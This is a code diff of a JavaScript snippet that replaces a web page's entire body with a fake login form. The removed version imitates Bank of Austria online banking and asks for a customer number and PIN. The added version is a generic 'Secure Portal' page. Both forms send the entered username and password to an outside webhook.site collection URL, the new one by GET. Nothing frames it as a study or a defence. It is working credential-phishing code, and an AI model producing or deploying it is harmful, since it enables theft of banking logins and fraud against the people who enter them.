@@ -1,22 +1,104 @@
 document.body.innerHTML = `
-<div style="font-family: Arial, sans-serif; max-width: 500px; margin: 60px auto; padding: 30px; border: 1px solid #ccc; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); background: white;">
-  <h2 style="text-align:center; color: #003087;">Bank of Austria</h2>
-  <p style="text-align:center; color: #444;">Welcome to Online Banking</p>
-  <p style="text-align:center; color: #d32f2f; font-weight:bold;">Please log in to continue</p>
-  
-  <form action="https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5" method="POST" style="display:flex; flex-direction:column; gap:15px;">
-    <label for="username">Username / Customer number</label>
-    <input type="text" id="username" name="username" placeholder="Enter your username" required style="padding:12px; border:1px solid #999; border-radius:4px; font-size:16px;">
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: #ffffff;
+        color: #333;
+    }
+    .header {
+        background-color: #222;
+        color: #999;
+        padding: 10px 40px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 18px;
+    }
+    .login-container {
+        max-width: 800px;
+        margin: 80px auto;
+        padding: 0 20px;
+    }
+    h1 {
+        font-weight: normal;
+        color: #333;
+        font-size: 32px;
+        margin-bottom: 10px;
+    }
+    p {
+        margin-bottom: 20px;
+        font-size: 14px;
+    }
+    .form-group {
+        margin-bottom: 15px;
+    }
+    label {
+        display: block;
+        font-weight: bold;
+        margin-bottom: 5px;
+        font-size: 14px;
+    }
+    input[type="text"], input[type="password"] {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+    }
+    input[type="submit"] {
+        padding: 8px 20px;
+        background-color: #f8f8f8;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-top: 10px;
+        font-size: 14px;
+    }
+    input[type="submit"]:hover {
+        background-color: #eee;
+    }
+    .footer-links {
+        margin-top: 30px;
+        font-size: 14px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    a {
+        color: #007bff;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+</style>
+
+<div class="header">
+    <span>Secure Portal</span>
+    <span style="font-size: 14px;">Login</span>
+</div>
+
+<div class="login-container">
+    <h1>Welcome to the Portal</h1>
+    <p>Please log in to your account:</p>
     
-    <label for="password">Password / PIN</label>
-    <input type="password" id="password" name="password" placeholder="Enter your password" required style="padding:12px; border:1px solid #999; border-radius:4px; font-size:16px;">
-    
-    <input type="submit" value="Login" style="padding:12px; background:#003087; color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer;">
-  </form>
-  
-  <p style="text-align:center; margin-top:20px; font-size:14px; color:#555;">
-    <a href="#" style="color:#003087;">Forgot your password?</a> | 
-    <a href="#" style="color:#003087;">Register now</a>
-  </p>
+    <form action="https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5" method="GET">
+        <div class="form-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" placeholder="Username">
+        </div>
+        
+        <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Password">
+        </div>
+        
+        <input type="submit" name="submit" value="Login">
+    </form>
+
+    <div class="footer-links">
+        <p>Don't have an account yet? <a href="#">Register a free account now!</a></p>
+        <p><a href="#">Reset your password</a></p>
+    </div>
 </div>
 `;
